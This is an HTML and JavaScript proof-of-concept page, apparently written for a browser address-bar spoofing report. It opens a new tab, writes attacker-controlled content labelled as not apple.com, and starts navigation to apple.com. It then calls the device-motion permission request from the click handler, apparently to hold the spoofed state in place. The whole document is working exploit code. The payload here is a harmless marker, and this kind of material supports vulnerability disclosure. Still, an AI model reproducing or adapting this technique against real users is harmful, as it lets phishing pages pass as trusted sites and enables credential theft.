<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />

    <title>Spoofing</title>

    <style>
      html,
      body {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #fff;
      }

      button {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);

        padding: 15px 30px;
        font-size: 18px;

        background: #007aff;
        color: #fff;

        border: none;
        border-radius: 10px;
        cursor: pointer;
      }
    </style>
  </head>

  <body>
    <button id="startBtn">CLICK HERE</button>

    <script>
      /*
       * Motion Permission
       *
       * Based on the reqMotion() implementation
       * from the provided PoC.
       */
      function reqMotion() {
        if (
          typeof DeviceMotionEvent?.requestPermission === "function"
        ) {
          DeviceMotionEvent.requestPermission()
            .then((res) => {
              console.log("Motion permission:", res);
            })
            .catch((err) => {
              console.log(
                "Motion permission denied/error:",
                err
              );
            });
        } else {
          console.log("Motion API not supported");
        }
      }

      document.getElementById("startBtn").onclick = function () {
        /*
         * Remove the original button.
         */
        this.remove();

        /*
         * Open a new tab containing attacker-controlled content.
         */
        const newTab = window.open("about:blank", "_blank");

        if (newTab) {
          newTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
              <meta charset="UTF-8">
              <title>testertester</title>
            </head>

            <body
              style="
                margin:0;
                padding:0;
                background:#fff;
                display:flex;
                align-items:center;
                justify-content:center;
                min-height:100vh;
                text-align:center;
              "
            >
              <div>

                <h1
                  style="
                    font-size:96px;
                    font-weight:bold;
                    color:red;
                    margin:0 0 30px 0;
                  "
                >
                  THIS IS NOT APPLE.COM!
                </h1>

                <i>
                  <p
                    style="
                      font-size:64px;
                      font-weight:bold;
                      color:#007aff;
                      margin:20px 0;
                    "
                  >
                    *THIS IS AN ATTACKER CONTROLLED PAGE
                  </p>
                </i>

              </div>
            </body>
            </html>
          `);

          newTab.document.close();

          /*
           * Start navigation to Apple.
           */
          setTimeout(() => {
            newTab.location.href = "https://apple.com/";
          }, 1);
        }

        /*
         * IMPORTANT:
         *
         * reqMotion() is called directly from the click
         * handler instead of inside another setTimeout().
         *
         * This preserves the user-activation context needed
         * by DeviceMotionEvent.requestPermission().
         */
        reqMotion();
      };
    </script>
  </body>
</html>
